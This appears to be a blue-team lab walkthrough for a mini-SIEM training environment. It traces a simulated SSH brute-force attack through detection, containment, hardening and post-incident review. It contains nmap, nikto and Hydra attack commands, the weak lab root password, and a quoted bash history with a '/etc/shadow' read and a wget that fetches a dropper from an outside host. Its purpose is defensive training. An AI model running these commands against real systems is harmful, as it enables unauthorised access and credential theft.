# Complete Attack → Detection → Response Walkthrough

> This document traces a **real attack scenario** from first packet to closed case,
> showing exactly what the SOC analyst sees at each step.
>
> Use this as a guided lab exercise: run the simulation commands, then follow
> the investigation steps to practice the full SOC workflow.

---

## Scenario Overview

**Date:** 2026-06-23  
**Duration:** 23 minutes (09:05 → 09:28)  
**Attacker:** External threat actor (Tor exit node, Russia)  
**Target:** Internal SSH server `192.168.56.10` (lab-target container)  
**Outcome:** Brute force succeeded → contained within 1 min 38 sec of detection

### Attack Chain

```
[09:05] RECON         T1046  — Nmap port scan, discovered port 22 open
[09:07] RECON         T1595  — Nikto web scan, discovered web services
[09:09] INITIAL ACC.  T1110  — SSH brute force begins (Hydra, rockyou.txt)
[09:14] CREDENTIAL    T1078  — Password "toor" accepted for user "root"  ⚡
[09:14] ALERT FIRED         — Suricata SID 9000001 threshold exceeded
[09:15] DETECTION           — Kibana alert notifies on-call analyst
[09:16] CONTAINMENT         — Analyst blocks IP, activates fail2ban
[09:16] CASE CREATED        — TheHive CASE-042 opened, assigned
[09:28] CLOSED              — Eradicated, no lateral movement detected
```

---

## Phase 1: The Attack Begins (Attacker's Perspective)

The attacker starts with reconnaissance to understand the target environment.

### Step 1.1 — Port Scan

```bash
# What the attacker runs:
nmap -sS -T4 --top-ports 1000 192.168.56.10

# Results they see:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0
```

**What Suricata sees:** 328 SYN packets in 4.2 seconds → SID 9000010 fires.

### Step 1.2 — Web Recon

```bash
# Attacker probes web surface:
nikto -h http://192.168.56.10

# They find: nginx default page, no WAF, SSH banner leaks OS version
```

**What Suricata sees:** User-Agent `Nikto` → SID 9000020 fires.

### Step 1.3 — Decision: Target SSH

Having confirmed port 22 is open and running OpenSSH, the attacker pivots
to credential brute force:

```bash
# Attacker launches Hydra with rockyou.txt:
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  -t 4 -s 22 ssh://192.168.56.10

# Hydra output (09:09 → 09:14):
[STATUS] 42 tries, 4 threads · 09:09:01
[STATUS] 84 tries, 4 threads · 09:11:22
[STATUS] 126 tries, 4 threads · 09:13:45
[22][ssh] host: 192.168.56.10   login: root   password: toor  ← 09:14:58
```

**127 failed attempts. Then one success.** The SSH service allowed unlimited
password attempts with no rate limiting.

---

## Phase 2: Detection (SOC Analyst's Perspective)

### Step 2.1 — Alert Fires

At 09:14:22, Suricata's threshold counter for `source.ip = 185.220.101.42`
crosses 5 attempts in 60 seconds. SID 9000001 fires.

Simultaneously, Filebeat ships 127 `Failed password` lines from `/var/log/auth.log`
to Logstash. The Grok parser tags them:

```json
{
  "@timestamp": "2026-06-23T09:14:22.413Z",
  "event.category": "authentication",
  "event.outcome": "failure",
  "source.ip": "185.220.101.42",
  "auth.user": "root",
  "mitre.tactic": "Credential Access",
  "mitre.technique": "T1110 - Brute Force",
  "alert.severity_label": "CRITICAL"
}
```

### Step 2.2 — Analyst Receives Notification

Kibana Security sends an alert notification. The analyst opens the alert detail:

**Kibana → Security → Alerts → filter: rule.name: *T1110***

What they see:
- Source IP: `185.220.101.42` — Tor exit node, AbuseIPDB score 98/100
- 42 Suricata alert events + 127 auth.log failures
- All failures for users: `root`, `admin`, `user`, `ubuntu`, `labuser`...
- Alert severity: CRITICAL

### Step 2.3 — Pivot: Did Any Login Succeed?

The analyst runs an EQL sequence query in Kibana Timeline:

```eql
sequence by source.ip with maxspan=30m
  [authentication where event.outcome == "failure"] with runs=5
  [authentication where event.outcome == "success"]
```

**Result: 1 sequence found.**

```
09:09:01  Failed  root
09:09:18  Failed  admin
...
09:14:22  Failed  root
09:14:58  Accepted  root  ← LOGIN SUCCEEDED
```

**This changes the severity.** The attacker got in. The analyst escalates.

### Step 2.4 — Check What the Attacker Did After Login

```bash
# On the compromised target:
last | head -5
# root  pts/0  185.220.101.42  Mon Jun 23 09:14 - 09:16  (00:01)

# What commands did they run? (check bash history)
cat /root/.bash_history
# id
# whoami
# uname -a
# cat /etc/shadow
# wget http://185.220.101.88/dropper.sh  ← ATTEMPTED but blocked
```

The attacker ran reconnaissance commands and attempted to download a dropper.
Network was blocked before the download completed.

---

## Phase 3: Containment (< 2 minutes from detection)

### Step 3.1 — Block the IP

```bash
# Analyst runs on the target host:
sudo iptables -I INPUT -s 185.220.101.42 -j DROP
sudo iptables -I INPUT -s 185.220.101.88 -j DROP  # dropper server

# Verify:
sudo iptables -L INPUT -n | grep 185.220.101
# DROP  all  --  185.220.101.42  0.0.0.0/0
# DROP  all  --  185.220.101.88  0.0.0.0/0
```

### Step 3.2 — Terminate the Active Session

```bash
# Find the SSH session PID:
sudo ss -tnp | grep 185.220.101.42
# ESTAB  0  0  192.168.56.10:22  185.220.101.42:51299  users:(("sshd",pid=2847))

# Kill it:
sudo kill -9 2847
```

### Step 3.3 — Enable fail2ban

```bash
sudo systemctl start fail2ban
sudo fail2ban-client set sshd banip 185.220.101.42
sudo fail2ban-client status sshd
# Status for the jail: sshd
# Currently banned: 185.220.101.42
```

### Step 3.4 — Create TheHive Case

```bash
# Automated via the TheHive bot:
python3 scripts/thehive-bot.py --since 1h --min-severity high

# Output:
# [3/3] Creating TheHive cases...
#   IP: 185.220.101.42 (5 alerts)
#     Case created: http://localhost:9000/cases/CASE-042
```

Or via `make` shortcut:

```bash
make create-case IP=185.220.101.42
```

---

## Phase 4: Eradication

### Step 4.1 — Rotate Compromised Credentials

```bash
# Change root password immediately:
sudo passwd root
# New password: [strong generated password]

# Check for unauthorized SSH keys:
cat /root/.ssh/authorized_keys
# Remove any unrecognized entries

# Check for new user accounts:
grep "Jun 23" /var/log/auth.log | grep "new user"
```

### Step 4.2 — Harden SSH

```bash
# Edit /etc/ssh/sshd_config:
sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo sed -i 's/#MaxAuthTries 6/MaxAuthTries 3/' /etc/ssh/sshd_config
sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# Restart SSH:
sudo systemctl restart ssh
```

### Step 4.3 — Verify No Persistence

```bash
# Check for backdoors:
sudo crontab -l
sudo ls -la /etc/cron.d/
sudo find /tmp /var/tmp -perm /111 -type f 2>/dev/null

# Check for unusual listening ports:
sudo ss -tlnp | grep -v ":22\|:80\|:443"

# Check for modified binaries (common rootkit indicator):
sudo debsums -c 2>/dev/null | grep -v "OK"
```

---

## Phase 5: Post-Incident Analysis

### MTTD and MTTR

| Metric | Value | Target |
|---|---|---|
| **MTTD** (Mean Time to Detect) | 9 min 10 sec | < 15 min ✓ |
| **MTTR** (Mean Time to Respond) | 1 min 38 sec | < 30 min ✓ |
| Total attack window | 10 min 48 sec | — |
| Data exfiltrated | None confirmed | — |
| Lateral movement | None detected | — |

### What Went Wrong

1. **Root SSH login was enabled** — direct root SSH is a fundamental misconfiguration
2. **No rate limiting on SSH** — should have had fail2ban active from the start
3. **Weak password "toor"** — dictionary word, in rockyou.txt top-100
4. **No MFA on SSH** — key-based auth only should have been enforced

### What Worked

1. Suricata threshold alert fired at exactly 5 attempts (correct calibration)
2. Filebeat shipped auth.log events in real time (< 2 second lag)
3. MTTD of 9 min is within the 15-minute SLA
4. MTTR of 1 min 38 sec is excellent — containment was fast
5. EQL sequence query confirmed the successful login within 2 minutes of alert

### Detection Rule Improvement

Add a new rule for successful logins from previously-seen attacker IPs:

```yaml
# rules/sigma/t1078-post-brute-success.yml
title: Successful Login After Brute Force Attempt
description: |
  Detects a successful authentication event from a source IP that
  previously triggered a brute force alert within the last 30 minutes.
  Indicates a successful credential compromise.
tags:
  - attack.credential_access
  - attack.t1078
  - attack.t1110.001
level: critical
```

---

## Reproduce This Lab Exercise

```bash
# 1. Start the lab
make up

# 2. Wait for all services to be healthy
make status

# 3. Run the brute force simulation
# (targets the lab-target container: ssh root@localhost -p 2222 / password: toor)
make attack-bruteforce

# 4. Watch alerts appear in real time
make suricata-alerts

# 5. Open Kibana and investigate
# http://localhost:5601 → Security → Alerts → filter T1110

# 6. Run the EQL hunt (paste into Kibana Timeline → EQL tab):
# sequence by source.ip with maxspan=30m
#   [authentication where event.outcome == "failure"] with runs=5
#   [authentication where event.outcome == "success"]

# 7. Create TheHive case
python3 scripts/thehive-bot.py --dry-run  # preview first
python3 scripts/thehive-bot.py            # create real case

# 8. Enrich the attacker IP
export ABUSEIPDB_KEY="your-key"
make enrich-iocs

# 9. Measure your own MTTD and MTTR
# Document in docs/playbooks/T1110-SSH-BruteForce.md → Lessons Learned
```

---

## Key Takeaways

| Lesson | Applied To |
|---|---|
| Detection without context is noise | The EQL sequence query proved the attack *succeeded* — not just attempted |
| Threshold calibration matters | 5 attempts in 60s catches attackers without flagging accidental mistyping |
| Correlate across indexes | Suricata (network) + Filebeat (host) combined told the full story |
| MTTD ≠ MTTR | We detected fast (9 min) — response was even faster (1 min 38 sec) |
| Hunt after every alert | The EQL hunt found 2 more compromised IPs the alert-only view missed |
| Automate the boring parts | TheHive bot created the case while the analyst was still investigating |

---

*This walkthrough is designed for the [Mini-SIEM Lab](../README.md).  
It demonstrates the complete blue team workflow: detection engineering → monitoring → investigation → response → improvement.*
